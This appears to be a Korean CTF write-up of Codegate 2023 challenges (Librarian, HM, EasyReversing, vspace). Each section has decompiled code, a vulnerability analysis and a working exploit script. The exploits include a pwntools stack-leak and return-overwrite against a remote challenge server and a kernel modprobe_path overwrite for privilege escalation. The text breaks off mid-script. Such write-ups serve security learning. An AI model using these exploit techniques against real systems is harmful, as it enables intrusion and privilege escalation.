rvu(\u0026#34;X3 : \u0026#34;) FLAG += (chr(int(rvu(\u0026#39;\\x0a\u0026#39;)[:-1],16))) print(FLAG) p.interactive() # IF # ID IF # ID2 ID IF # EX ID2 ID IF # WB EX ID2 ID IF # IF WB EX ID2 ID IF # ID IF WB EX ID2 ID IF Librarian Analysis sub_184C(); v3 = time(0LL); srand(v3); memset(s, 0, 0x780uLL); while ( (unsigned int)cnt \u0026lt;= 9 ) { v6 = rand() % 30; strcpy(\u0026amp;s[0x80 * (unsigned __int64)(unsigned int)cnt], \u0026amp;aTheCatcherInTh[0x40 * (__int64)v6]); ++cnt; } do { print_menu(); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v5); switch ( v5 ) { case 1: display((__int64)s); break; case 2: if ( (unsigned int)cnt \u0026gt; 14 ) { puts(\u0026#34;The book list is full.\u0026#34;); } else { add((__int64)s); sort((__int64)s); } break; case 3: sub_172A((__int64)s); break; case 4: sub_180F(s); break; case 5: puts(\u0026#34;Exiting...\u0026#34;); break; default: puts(\u0026#34;Invalid choice. Please try again.\u0026#34;); break; } } while ( v5 != 5 ); return 0LL; } 랜덤한 이름으로 초기화된다.\nunsigned __int64 __fastcall sub_172A(__int64 a1) { unsigned int v2; // [rsp+18h] [rbp-58h] int v3; // [rsp+1Ch] [rbp-54h] char buf[72]; // [rsp+20h] [rbp-50h] BYREF unsigned __int64 v5; // [rsp+68h] [rbp-8h] v5 = __readfsqword(0x28u); printf(\u0026#34;Index: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, v2); if ( v2 \u0026gt;= cnt ) { puts(\u0026#34;Index must be less than the number of books.\u0026#34;); } else { v3 = read(0, buf, 0x3FuLL); if ( buf[v3 - 1] == \u0026#39;\\n\u0026#39; ) buf[v3 - 1] = 0; memcpy((void *)(((unsigned __int64)v2 \u0026lt;\u0026lt; 7) + a1 + 0x40), buf, v3); } return v5 - __readfsqword(0x28u); } case3에서 scanf %d, v2로 받는데, v2가 unsigned int이고 포인터가 아니라 무조건 터진다. 사실상 없는 기능이다.\nunsigned __int64 __fastcall add(__int64 a1) { int v2; // [rsp+1Ch] [rbp-54h] char buf[72]; // [rsp+20h] [rbp-50h] BYREF unsigned __int64 v4; // [rsp+68h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\u0026#34;Book title: \u0026#34;); v2 = read(0, buf, 0x3FuLL); if ( buf[v2 - 1] == 10 ) buf[v2 - 1] = 0; memcpy((void *)(((unsigned __int64)(unsigned int)cnt \u0026lt;\u0026lt; 7) + a1), buf, v2); ++cnt; return v4 - __readfsqword(0x28u); } 여기서 case2에서 입력받고, 추가한다. 그리고 sort 함수를 호출한다.\nv4 = cnt - 2; while ( v4 \u0026gt;= 0 ) { if ( strcmp((const char *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1), (const char *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1)) \u0026gt;= 0 || v4 == cnt ) { --v4; } else // swap { v1 = (__int64 *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1); v5 = *v1; v6 = v1[1]; v7 = v1[2]; v8 = v1[3]; v9 = v1[4]; v10 = v1[5]; v11 = v1[6]; v12 = v1[7]; v13 = v1[8]; v14 = v1[9]; v15 = v1[10]; v16 = v1[11]; v17 = v1[12]; v18 = v1[13]; v19 = v1[14]; v20 = v1[15]; memcpy(v1, (const void *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1), 0x40uLL);// if s[0] \u0026lt; s[1] -\u0026gt; s[0] = s[1] memcpy((void *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1 + 0x40), (const void *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1 + 64), 0x40uLL); v2 = (_QWORD *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1); *v2 = v5; // s[1] = s[0] v2[1] = v6; v2[2] = v7; v2[3] = v8; v2[4] = v9; v2[5] = v10; v2[6] = v11; v2[7] = v12; v2 += 8; *v2 = v13; v2[1] = v14; v2[2] = v15; v2[3] = v16; v2[4] = v17; v2[5] = v18; v2[6] = v19; v2[7] = v20; ++v4; } } return v21 - __readfsqword(0x28u); } 버블 소트 비스무리하게 생겼다. 문자열 크기가 큰 순서대로 뒤로간다.\nExploitation strcmp((const char *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1), (const char *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1)) \u0026gt;= 0 || v4 == cnt 조건을 만족하지 않으면 swap하고 v4++가 된다. v4 == cnt-1로 수정되어야한다. v4에 대한 경계 체크가 미흡해서 sfp, ret, canary 릭이 가능하고, 크기를 잘 맞추면 덮는 것도 가능하다.\nExploit script from pwn import * DEBUG = False context.terminal=[\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] context.binary = e = ELF(\u0026#39;./librarian\u0026#39;) libc = ELF(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) off = [0x0175D,] # 0x13F4,0x0151D,0x0156B script = \u0026#39;\u0026#39; for i in off: script += f\u0026#39;brva {hex(i)}\\n\u0026#39; if DEBUG: p = gdb.debug(e.path,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;./libc.so.6\u0026#34;}, gdbscript=script) else : #p = process(e.path,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;./libc.so.6\u0026#34;}) p = remote(\u0026#39;43.201.16.196\u0026#39;,8888) sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) def add_book(x): sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) sa(b\u0026#39;Book title: \u0026#39;,x) sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) for i in range(14): add_book(b\u0026#39;A\u0026#39;*(0x30+i+1)) add_book(b\u0026#39;A\u0026#39;*(0x1)) sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;1. \u0026#39;) p.recv(8) canary = u64(p.recv(8)) p.recv(8) libc_base = u64(p.recv(8)) - 0x23510 success(\u0026#34;libc_base : \u0026#34; + hex(libc_base)) stack = u64(p.recv(8)) success(\u0026#34;stack : \u0026#34; + hex(stack)) success(\u0026#34;canary : \u0026#34; + hex(canary)) sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) for i in range(13): add_book(b\u0026#39;B\u0026#39;*(0x30+i+1)) pay = b\u0026#39;\\xff\u0026#39;*0x8 + p64(canary) pay += p64(0) pay += p64(libc_base + 0x4e1d0) pay += b\u0026#39;\\xff\u0026#39;*(0x30+14- len(pay)) add_book(pay) add_book(b\u0026#39;B\u0026#39;*(0x1)) sla(\u0026#39;choice:\u0026#39;,b\u0026#39;5\u0026#39;) p.interactive() codegate2023{dceb0dcf4aed699a87d1f831f5ff5d5402135fcd211f4bbffab699915b9c78a0de98b6d5b53aaf3c19b8673805de1c8b0325c4c4cd18bc72fe73610f}\nHM Analysis __int64 __fastcall m_ioctl(__int64 a1, __int64 a2) { __int64 args; // rdx __int64 result; // rax _fentry__(a1, a2); copy_from_user(\u0026amp;user_input, args, 0x10LL); result = 0LL; if ( (_DWORD)a2 == 0x1337 ) // 0x1337 { copy_from_user(user_input, *(\u0026amp;user_input + 1), 0xCLL); return 1LL; } return result; } AAW를 준다.\n#!/bin/sh /bin/busybox --install -s stty raw -echo chown -R 0:0 / mkdir -p /proc \u0026amp;\u0026amp; mount -t proc none /proc mkdir -p /dev \u0026amp;\u0026amp; mount -t devtmpfs devtmpfs /dev mkdir -p /tmp \u0026amp;\u0026amp; mount -t tmpfs tmpfs /tmp echo 0 \u0026gt; /proc/sys/kernel/kptr_restrict echo 0 \u0026gt; /proc/sys/kernel/perf_event_paranoid echo 1 \u0026gt; d chmod 444 /proc/kallsyms chmod 400 /flag insmod /hm.ko chmod 666 /dev/hm mv /exploit /tmp/exploit chown -R 1000:1000 /tmp setsid /bin/cttyhack setuidgid 1000 /bin/sh umount /proc poweroff -d 1 -n -f rootfs/etc/init.d/rcS를 보면 위와 같다. kadr이 비활성화되어있다.\nExploitation KADR 안걸려있으니 릭하고 modprobe_path 덮었다.\nExploit script #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; struct info { uint64_t dst; // must be kernel space uint8_t * src; }; void shell(void){ system(\u0026#34;echo \u0026#39;#!/bin/sh\\nchmod 777 /flag\u0026#39; \u0026gt; /tmp/x\u0026#34;); system(\u0026#34;chmod +x /tmp/x\u0026#34;); system(\u0026#34;echo -ne \u0026#39;\\\\xff\\\\xff\\\\xff\\\\xff\u0026#39; \u0026gt; /tmp/v\u0026#34;); system(\u0026#34;chmod +x /tmp/v\u0026#34;); system(\u0026#34;/tmp/v\u0026#34;); system(\u0026#34;cat /flag\u0026#34;); exit(0); } int main(){ int fd = open(\u0026#34;/dev/hm\u0026#34;,O_RDONLY); if (fd == -1) exit(-1); struct info io; system(\u0026#34;cat /proc/kallsyms | grep modprobe_path\u0026#34;); uint64_t modprobe_path; puts(\u0026#34;\u0026gt; \u0026#34;); scanf(\u0026#34;%lx\u0026#34;,\u0026amp;modprobe_path); printf(\u0026#34;modprobe_path : %lx\u0026#34;,modprobe_path); io.dst = modprobe_path; io.src = malloc(0x20); strcpy(io.src,\u0026#34;/tmp/x\\x00\u0026#34;); ioctl(fd, 0x1337, \u0026amp;io); shell(); close(fd); return 0; } codegate2023{cOnGrAtUlAtIoNs_!_HoPe_1t_wAs_a_FuN_cHaLl}\nEasyReversing Analysis void __noreturn sub_7FF7E1AA2030() { char *v0; // rdi __int64 i; // rcx char v2[280]; // [rsp+20h] [rbp+0h] BYREF v0 = v2; for ( i = 26i64; i; --i ) { *(_DWORD *)v0 = -858993460; v0 += 4; } sub_7FF7E1AA13A2(byte_7FF7E1AB20A3); memset(\u0026amp;v2[16], 0, 0x40ui64); SetUnhandledExceptionFilter(TopLevelExceptionFilter); __debugbreak(); } 메인 로직 잘 찾아서 확인했더니 슈도코드가 짤려있다.\n.text:00007FF7E1AA2030 ; __unwind { // j___GSHandlerCheck .text:00007FF7E1AA2030 push rbp .text:00007FF7E1AA2032 push rdi .text:00007FF7E1AA2033 sub rsp, 148h .text:00007FF7E1AA203A lea rbp, [rsp+20h] .text:00007FF7E1AA203F lea rdi, [rsp+150h+var_130] .text:00007FF7E1AA2044 mov ecx, 1Ah .text:00007FF7E1AA2049 mov eax, 0CCCCCCCCh .text:00007FF7E1AA204E rep stosd .text:00007FF7E1AA2050 mov rax, cs:__security_cookie .text:00007FF7E1AA2057 xor rax, rbp .text:00007FF7E1AA205A mov [rbp+130h+var_18], rax .text:00007FF7E1AA2061 lea rcx, byte_7FF7E1AB20A3 .text:00007FF7E1AA2068 call sub_7FF7E1AA13A2 .text:00007FF7E1AA206D lea rax, [rbp+130h+Buf1] .text:00007FF7E1AA2071 mov rdi, rax .text:00007FF7E1AA2074 xor eax, eax .text:00007FF7E1AA2076 mov ecx, 40h ; \u0026#39;@\u0026#39; .text:00007FF7E1AA207B rep stosb .text:00007FF7E1AA207D lea rcx, TopLevelExceptionFilter ; lpTopLevelExceptionFilter .text:00007FF7E1AA2084 call cs:SetUnhandledExceptionFilter .text:00007FF7E1AA208A int 3 ; Trap to Debugger .text:00007FF7E1AA208B ; --------------------------------------------------------------------------- .text:00007FF7E1AA208B lea rcx, aInput ; \u0026#34;INPUT: \u0026#34; .text:00007FF7E1AA2092 call sub_7FF7E1AA11A9 .text:00007FF7E1AA2097 mov r8d, 40h ; \u0026#39;@\u0026#39; .text:00007FF7E1AA209D lea rdx, [rbp+130h+Buf1] .text:00007FF7E1AA20A1 lea rcx, Format ; \u0026#34;%s\u0026#34; .text:00007FF7E1AA20A8 call scanf .text:00007FF7E1AA20AD lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20B1 call stage_1 .text:00007FF7E1AA20B6 lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20BA call stage_2 .text:00007FF7E1AA20BF lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20C3 call stage_3 .text:00007FF7E1AA20C8 lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20CC call stage_4 .text:00007FF7E1AA20D1 mov r8d, 40h ; \u0026#39;@\u0026#39; ; Size .text:00007FF7E1AA20D7 lea rdx, unk_7FF7E1AAD280 ; Buf2 .text:00007FF7E1AA20DE lea rcx, [rbp+130h+Buf1] ; Buf1 .text:00007FF7E1AA20E2 call j_memcmp .text:00007FF7E1AA20E7 test eax, eax .text:00007FF7E1AA20E9 jnz short loc_7FF7E1AA20F9 .text:00007FF7E1AA20EB lea rcx, aCorrect ; \u0026#34;Correct!\\n\u0026#34; .text:00007FF7E1AA20F2 call sub_7FF7E1AA11A9 .text:00007FF7E1AA20F7 jmp short loc_7FF7E1AA2105 .text:00007FF7E1AA20F9 ; --------------------------------------------------------------------------- .text:00007FF7E1AA20F9 .text:00007FF7E1AA20F9 loc_7FF7E1AA20F9: ; CODE XREF: sub_7FF7E1AA2030+B9↑j .text:00007FF7E1AA20F9 lea rcx, aNope ; \u0026#34;Nope...\\n\u0026#34; .text:00007FF7E1AA2100 call sub_7FF7E1AA11A9 .text:00007FF7E1AA2105 .text:00007FF7E1AA2105 loc_7FF7E1AA2105: ; CODE XREF: sub_7FF7E1AA2030+C7↑j .text:00007FF7E1AA2105 call cs:getchar .text:00007FF7E1AA210B xor eax, eax .text:00007FF7E1AA210D mov edi, eax .text:00007FF7E1AA210F lea rcx, [rbp+130h+var_150] .text:00007FF7E1AA2113 lea rdx, unk_7FF7E1AAAD00 .text:00007FF7E1AA211A call sub_7FF7E1AA133E .text:00007FF7E1AA211F mov eax, edi .text:00007FF7E1AA2121 mov rcx, [rbp+130h+var_18] .text:00007FF7E1AA2128 xor rcx, rbp ; StackCookie .text:00007FF7E1AA212B call j___security_check_cookie .text:00007FF7E1AA2130 lea rsp, [rbp+128h] .text:00007FF7E1AA2137 pop rdi .text:00007FF7E1AA2138 pop rbp .text:00007FF7E1AA2139 retn .text:00007FF7E1AA2139 ; } // starts at 7FF7E1AA2030 .text:00007FF7E1AA2139 sub_7FF7E1AA2030 endp .text:00007FF7E1AA2139 .text:00007FF7E1AA2139 ; -------------------------------------- SetUnhandledExceptionFilter에서 디버거가 없을때 실행되는 TopLevelExceptionFilter 콜백 함수를 등록했다.\n__int64 __fastcall sub_7FF7E1AA1830(_EXCEPTION_POINTERS *a1) { DWORD64 v2; // [rsp+68h] [rbp+48h] __int64 v3; // [rsp+68h] [rbp+48h] int n; // [rsp+84h] [rbp+64h] int j; // [rsp+84h] [rbp+64h] int k; // [rsp+84h] [rbp+64h] int m; // [rsp+84h] [rbp+64h] int ii; // [rsp+84h] [rbp+64h] int i; // [rsp+A4h] [rbp+84h] sub_7FF7E1AA13A2(byte_7FF7E1AB20A3); if ( a1-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode == 0x80000003 ) { ++a1-\u0026gt;ContextRecord-\u0026gt;Rip; a1-\u0026gt;ContextRecord-\u0026gt;Dr0 = (DWORD64)stage_1; a1-\u0026gt;ContextRecord-\u0026gt;Dr1 = (DWORD64)stage_2; a1-\u0026gt;ContextRecord-\u0026gt;Dr2 = (DWORD64)stage_3; a1-\u0026gt;ContextRecord-\u0026gt;Dr3 = (DWORD64)stage_4; a1-\u0026gt;ContextRecord-\u0026gt;Dr7 |= 0x44ui64; return 0xFFFFFFFFi64; } else if ( a1-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode == 0x80000004 ) { v2 = a1-\u0026gt;ContextRecord-\u0026gt;Dr6 \u0026amp; 0xF; if ( v2 ) { for ( i = 0; i \u0026lt; 4 \u0026amp;\u0026amp; (v2 \u0026amp; 1) != 1; ++i ) v2 \u0026gt;\u0026gt;= 1; if ( i ) { switch ( i ) { case 1: for ( j = 0; j \u0026lt; 256; ++j ) sbox[j] += 0x15; break; case 2: for ( k = 0; k \u0026lt; 256; ++k ) sbox_2[k] -= 0x3C; break; case 3: for ( m = 0; m \u0026lt; 64; ++m ) table_2[m] ^= 0x9Fu; break; } } else { for ( n = 0; n \u0026lt; 64; ++n ) table_1[n] ^= 5u; } v3 = 1i64; for ( ii = 0; ii \u0026lt; i; ++ii ) v3 *= 4i64; a1-\u0026gt;ContextRecord-\u0026gt;Dr7 \u0026amp;= ~v3; return 0xFFFFFFFFi64; } else { return 0i64; } } else { return 0i64; } } _EXCEPTION_POINTERS 구조체 포인터가 인자로 넘겨진다. 처음에 int3로 트랩이 걸리면 Dr0~Dr3에 함수 주소를 넣는다. Dr7에 0x44가 들어간다. Dr1, Dr3 부분만 걸리니 그 부분만 따로 연산을 진행하면 실제 테이블 값을 얻을 수 있다.\nstage1, stage2, stage3, stage4는 단순 xor 이거나 치환이다.\nExploitation 미리 테이블 구해놓고 단순 역연산을 하면 된다.\nExploit script table_1 = [120, 80, 27, 214, 131, 229, 135, 253, 203, 159, 151, 227, 55, 141, 240, 184, 235, 187, 212, 63, 180, 251, 193, 14, 10, 170, 92, 5, 134, 39, 138, 77, 70, 81, 110, 145, 93, 126, 205, 207, 118, 8, 92, 170, 220, 226, 81, 220, 2, 139, 7, 84, 128, 80, 136, 195, 178, 207, 144, 99, 25, 181, 185, 19] sbox = [45, 134, 204, 241, 109, 236, 18, 228, 50, 129, 87, 218, 132, 225, 250, 127, 28, 101, 233, 95, 170, 142, 121, 32, 51, 242, 110, 76, 253, 111, 208, 58, 10, 115, 116, 12, 92, 209, 182, 65, 207, 234, 146, 222, 240, 198, 2, 94, 147, 98, 30, 212, 86, 246, 206, 171, 55, 9, 164, 112, 158, 252, 192, 174, 145, 3, 96, 74, 82, 202, 5, 189, 103, 201, 78, 93, 53, 25, 200, 186, 173, 196, 43, 91, 89, 235, 194, 133, 23, 83, 213, 190, 150, 118, 36, 72, 149, 124, 154, 249, 245, 197, 168, 232, 238, 226, 29, 33, 137, 148, 126, 243, 223, 52, 90, 239, 193, 31, 40, 77, 187, 81, 73, 156, 136, 66, 237, 37, 14, 62, 16, 165, 169, 113, 152, 140, 251, 24, 139, 49, 57, 214, 248, 107, 38, 227, 56, 184, 61, 177, 20, 63, 125, 70, 255, 120, 178, 99, 195, 153, 162, 130, 13, 46, 7, 224, 181, 185, 54, 203, 88, 114, 26, 106, 220, 8, 210, 144, 27, 188, 199, 161, 39, 219, 48, 11, 143, 68, 1, 216, 15, 167, 67, 176, 183, 59, 21, 254, 104, 4, 97, 151, 119, 157, 122, 102, 215, 179, 180, 217, 117, 42, 135, 60, 163, 35, 160, 128, 229, 131, 244, 80, 22, 79, 47, 0, 100, 105, 231, 141, 19, 17, 41, 191, 221, 230, 155, 175, 211, 166, 69, 172, 108, 84, 64, 138, 44, 34, 85, 6, 75, 123, 159, 205, 247, 71] rev_sbox=[0 for _ in range(256)] sbox_2 = [4, 247, 89, 2, 96, 133, 175, 151, 56, 188, 212, 36, 28, 187, 208, 152, 172, 48, 37, 174, 130, 239, 191, 10, 92, 207, 88, 126, 131, 132, 71, 63, 39, 149, 43, 186, 235, 251, 69, 94, 103, 34, 134, 155, 1, 228, 17, 183, 97, 199, 157, 236, 62, 41, 164, 185, 25, 168, 234, 227, 206, 82, 177, 125, 169, 33, 195, 160, 20, 16, 79, 237, 52, 32, 167, 47, 217, 60, 50, 211, 121, 122, 205, 45, 173, 54, 198, 9, 68, 38, 105, 176, 19, 53, 250, 98, 119, 110, 153, 229, 159, 158, 170, 184, 107, 115, 179, 156, 166, 111, 87, 216, 161, 127, 73, 221, 109, 67, 194, 147, 61, 233, 108, 128, 11, 59, 145, 214, 255, 162, 46, 14, 180, 21, 242, 193, 139, 101, 120, 165, 238, 146, 24, 154, 118, 196, 99, 232, 55, 150, 249, 124, 142, 230, 113, 95, 163, 141, 70, 253, 13, 231, 243, 213, 210, 104, 49, 26, 102, 224, 31, 117, 76, 204, 140, 51, 136, 77, 245, 5, 80, 85, 200, 241, 44, 81, 226, 219, 181, 190, 74, 100, 192, 209, 178, 90, 22, 137, 3, 222, 66, 15, 86, 84, 148, 114, 12, 29, 123, 143, 244, 112, 201, 203, 64, 23, 40, 93, 129, 254, 246, 135, 27, 58, 171, 225, 57, 7, 144, 18, 220, 65, 75, 240, 30, 0, 42, 35, 138, 197, 218, 215, 8, 182, 72, 106, 252, 6, 78, 91, 223, 83, 116, 189, 248, 202] rev_sbox_2=[0 for _ in range(256)] table_2 = [163, 242, 234, 9, 129, 221, 211, 62, 14, 202, 9, 40, 252, 60, 48, 0, 99, 228, 26, 236, 215, 118, 141, 8, 215, 8, 61, 141, 113, 180, 159, 165, 10, 172, 196, 78, 8, 152, 251, 55, 157, 39, 242, 188, 68, 221, 164, 154, 24, 42, 43, 119, 3, 167, 134, 102, 159, 214, 96, 33, 158, 134, 218, 141] def rev_stage_1(x): for i in range(64): x[i] ^= table_1[i] def rev_stage_2(x): for i in range(64): x[i] = rev_sbox[x[i]] def rev_stage_3(x): for i in range(64): x[i] = rev_sbox_2[x[i]] def rev_stage_4(x): for i in range(64): x[i] ^= table_2[i] def Exception(f): global table_1, table_2, sbox,sbox_2 i = 0 if f\u0026amp;0xf: while True: if (f \u0026amp; 1) != 1: f\u0026gt;\u0026gt;=1 i+=1 else: break if i==0: for i in range(64): table_1[i] ^= 5 elif i ==1 : for i in range(256): sbox[i] += 0x15 sbox[i] \u0026amp;= 0xff elif i ==2 : for i in range(256): sbox_2[i] -= 0x3c sbox_2[i] \u0026amp;= 0xff elif i == 3: for i in range(64): table_2[i] ^= 0x9f cmp = [82, 55, 159, 25, 106, 8, 63, 194, 239, 209, 252, 184, 196, 232, 214, 4, 71, 159, 226, 6, 72, 105, 239, 51, 145, 73, 160, 54, 154, 51, 210, 144, 170, 23, 254, 113, 51, 243, 211, 17, 186, 97, 60, 30, 144, 206, 102, 96, 215, 139, 202, 135, 197, 239, 75, 201, 167, 218, 23, 131, 68, 80, 177, 4] # Exception(1\u0026lt;\u0026lt;0) Exception(1\u0026lt;\u0026lt;1) # Exception(1\u0026lt;\u0026lt;2) Exception(1\u0026lt;\u0026lt;3) for i in range(256): rev_sbox_2[sbox_2[i]] = i rev_sbox[sbox[i]] = i rev_stage_4(cmp) rev_stage_3(cmp) rev_stage_2(cmp) rev_stage_1(cmp) print(cmp) for i in cmp: print(chr(i),end=\u0026#39;\u0026#39;) codegate2023{c3fe22c964e2640b104fd3269a820f72}\nvspace Analysis from EngineStruct import Instruction from Engine import VMEngine import json import base64 import binascii import sys import signal def timeout_handler(signum, frame): print(\u0026#34;time out.\u0026#34;) raise SystemExit() # very very very very very very very very very very easy code virutalization teq def main(): code = input(\u0026#34;Input code:\u0026#34;) try: decode_data = base64.b64decode(code) except binascii.Error: print(\u0026#34;[!] base64 decode error!\u0026#34;) sys.exit(0) try: json_insns = json.loads(decode_data) except json.decoder.JSONDecodeError: print(\u0026#34;[!] json decode error!\u0026#34;) sys.exit(0) vme = VMEngine() vme.set_black_list([\u0026#34;flag\u0026#34;]) vme.set_file_options([\u0026#34;exists\u0026#34;]) instructions = vme.parse_json(json_insns) print(\u0026#34;[*] Init instructions ....\u0026#34;) print(\u0026#34;[+] Execute IL!\u0026#34;) print(\u0026#34;----------------------------------\u0026#34;) vme.run(instructions) print(\u0026#34;----------------------------------\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: timeout_seconds = 3 signal.signal(signal.SIGALRM, timeout_handler) signal.alarm(timeout_seconds) main() from EngineStruct import Stack, Instruction import pathlib import types import time class VMEngine: def __init__(self): self.pc = 0 self.stack = Stack() self.values = {} self.set_black_list([]) self.set_file_options([\u0026#34;read_text\u0026#34;, \u0026#34;exists\u0026#34;, \u0026#34;glob\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;read_bytes\u0026#34;, \u0026#34;mkdir\u0026#34;, \u0026#34;write_bytes\u0026#34;, \u0026#34;write_text\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;is_file\u0026#34;]) def set_black_list(self, blacklist): self.values[\u0026#34;blacklist\u0026#34;] = blacklist def get_black_list(self): return self.values[\u0026#34;blacklist\u0026#34;] def set_file_options(self, options): self.values[\u0026#34;file_options\u0026#34;] = options def get_file_options(self): return self.values[\u0026#34;file_options\u0026#34;] def run(self, instructions): while True: if self.pc \u0026gt;= len(instructions): break insn = instructions[self.pc] match insn.opcode: case \u0026#34;😀\u0026#34;: self.stack.push(insn.opnd[0]) case \u0026#34;😄\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 + operand2) case \u0026#34;😁\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 - operand2) case \u0026#34;😆\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 * operand2) case \u0026#34;🥹\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 / operand2) case \u0026#34;😂\u0026#34;: operand1 = insn.opnd[0] value = self.stack.pop() if type(operand1) != str: print(\u0026#34;Operand type error!\u0026#34;) break self.values[operand1] = value case \u0026#34;😅\u0026#34;: operand1 = insn.opnd[0] if type(operand1) != str: print(\u0026#34;Operand type error!\u0026#34;) break try: value = self.values[operand1] self.stack.push(value) except KeyError: print(\u0026#34;Values key error!\u0026#34;) break case \u0026#34;🤣\u0026#34;: key = insn.opnd[0] operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != type(operand2): print(\u0026#34;Operand type error!\u0026#34;) break self.values[key] = operand1 == operand2 case \u0026#34;🥲\u0026#34;: index = insn.opnd[0] if type(index) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.pc += index continue case \u0026#34;😍\u0026#34;: index = insn.opnd[1] key = insn.opnd[0] if type(index) != int or type(key) != str: print(\u0026#34;Operand type error!\u0026#34;) break try: result = self.values[key] except KeyError: print(\u0026#34;Values key error!\u0026#34;) break if result: self.pc += index else: self.pc += 1 continue case \u0026#34;🥰\u0026#34;: index = insn.opnd[1] key = insn.opnd[0] if type(index) != int or type(key) != str: print(\u0026#34;Operand type error!\u0026#34;) break try: result = self.values[key] except KeyError: print(\u0026#34;Values key error!\u0026#34;) break if not result: self.pc += index else: self.pc += 1 continue case \u0026#34;✓\u0026#34;: print(self.stack.pop()) case \u0026#34;⭐️\u0026#34;: data1 = self.stack.pop() data2 = self.stack.pop() if type(data1) != str or type(data2) != str: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(data1 + data2) case \u0026#34;♥️\u0026#34;: data = self.stack.pop() index = self.stack.pop() if type(data) != str or type(index) != int: print(\u0026#34;Operand type error!\u0026#34;) break try: self.stack.push(data[index]) except IndexError: print(\u0026#34;Out of index error!\u0026#34;) break case \u0026#34;➖\u0026#34;: char = self.stack.pop() if type(data) != str and len(data) != 1: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(len(char)) case \u0026#34;🐸\u0026#34;: print(\u0026#34;Exit!\u0026#34;) break case \u0026#34;🧠\u0026#34;: filename = self.stack.pop() index = self.stack.pop() if type(filename) != str: print(\u0026#34;Operand type error!\u0026#34;) break _path = pathlib.Path(filename) if _path.name in self.get_black_list(): print(\u0026#34;Blacklist error!\u0026#34;) break options = self.get_file_options() try: result = _path.__getattribute__(options[index])(*insn.opnd) if types.GeneratorType == type(result): self.stack.push(list(result)) else: self.stack.push(result) except IndexError: print(\u0026#34;Out of range!\u0026#34;) break case \u0026#34;🗣️\u0026#34;: sleep_time = self.stack.pop() if type(sleep_time) != int: print(\u0026#34;Operand type error!\u0026#34;) break time.sleep(sleep_time) case _: print(\u0026#34;Wtf?\u0026#34;) break self.pc += 1 def parse_json(self, insntructions:list): result = [] for insn in insntructions: result.append(Instruction(insn[\u0026#34;opcode\u0026#34;], insn[\u0026#34;operands\u0026#34;])) return result 단순 VM이다. 여러 명령어들이 지원된다. 기본적으로 exists 같은 기능만 지원되고 블랙리스트도 걸려있다.\nExploitation 딕셔너리 키 검증이 없고 따로 제한이 있는 것도 아니라서 마음대로 파일 읽거나 확인이 가능하다.\nExploit script import json import base64 from pwn import * IL = [] def gen_IL(opcode,operands=[]): global IL IL.append({\u0026#34;opcode\u0026#34;:opcode, \u0026#34;operands\u0026#34;:operands}) def payload(x): json_string = json.dumps(x) return (base64.b64encode(json_string.encode(\u0026#39;utf-8\u0026#39;))) push = \u0026#34;😀\u0026#34; add = \u0026#34;😄\u0026#34; sub = \u0026#34;😁\u0026#34; mul = \u0026#34;😆\u0026#34; div = \u0026#34;🥹\u0026#34; reg_v = \u0026#34;😂\u0026#34; # values[opnd[0]] = value push_reg = \u0026#34;😅\u0026#34; # push self.values[opnd[0]] cmpeq = \u0026#34;🤣\u0026#34; # self.values[opnd[0]] = operand1 == operand2 jmp = \u0026#34;🥲\u0026#34; cont_jmp = \u0026#34;😍\u0026#34; # if self.values[opnd[0]] -\u0026gt; jmp opnd[1] conf_jmp = \u0026#34;🥰\u0026#34; # if not self.values[opnd[0]] -\u0026gt; jmp opnd[1] dump_stack = \u0026#34;✓\u0026#34; # 